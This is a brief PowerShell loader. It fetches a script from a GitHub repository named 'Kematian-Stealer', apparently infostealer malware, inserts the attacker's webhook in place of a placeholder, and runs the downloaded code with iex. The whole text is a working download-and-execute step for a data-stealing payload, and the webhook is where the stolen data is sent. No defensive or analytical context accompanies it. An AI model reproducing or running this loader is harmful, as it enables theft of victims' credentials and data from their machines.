$powershell_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1"

#replace YOUR_WEBHOOK_HERE with $webhook
$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "YOUR_WEBHOOK_HERE", "$webhook"

iex $content